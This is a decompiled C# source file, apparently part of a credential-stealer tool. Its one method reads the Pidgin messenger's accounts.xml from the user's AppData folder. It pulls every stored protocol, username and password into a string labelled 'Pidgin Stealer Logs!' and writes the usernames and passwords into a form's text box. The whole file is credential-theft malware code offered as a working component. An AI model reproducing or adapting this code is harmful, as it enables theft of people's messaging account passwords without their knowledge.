using System;
using System.IO;
using System.Windows.Forms;
using System.Xml;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace ns3;

internal sealed class Class16
{
	public static string smethod_0()
	{
		XmlDocument xmlDocument = new XmlDocument();
		object obj = null;
		string result = "";
		string text = Interaction.Environ("appdata") + "\\.purple\\accounts.xml";
		checked
		{
			if (File.Exists(text))
			{
				try
				{
					xmlDocument.Load(text);
					XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("protocol");
					XmlNodeList elementsByTagName2 = xmlDocument.GetElementsByTagName("name");
					XmlNodeList elementsByTagName3 = xmlDocument.GetElementsByTagName("password");
					int num = elementsByTagName.Count - 1;
					int i;
					for (i = 0; i <= num; i++)
					{
						obj = Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(obj, (object)"Pidgin Stealer Logs!"), (object)"\r\n"), (object)"Protocol: "), (object)elementsByTagName[i]!.InnerText), (object)"\r\n"), (object)"Username: "), (object)elementsByTagName2[i]!.InnerText), (object)"\r\n"), (object)"Password: "), (object)elementsByTagName3[i]!.InnerText), (object)"\r\n"), (object)"\r\n");
					}
					string text2 = "\r\n";
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text2);
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("============Pidgin==============");
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text2);
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("Username: " + elementsByTagName2[i]!.InnerText);
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text2);
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("Password: " + elementsByTagName3[i]!.InnerText);
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text2);
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("=============================");
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text2);
					return result;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					string text3 = "\r\n";
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text3);
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("============Pidgin==============");
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text3);
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("Pidgin Not Installed!");
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text3);
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("=============================");
					((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text3);
					ProjectData.ClearProjectError();
					return result;
				}
			}
			return result;
		}
	}
}
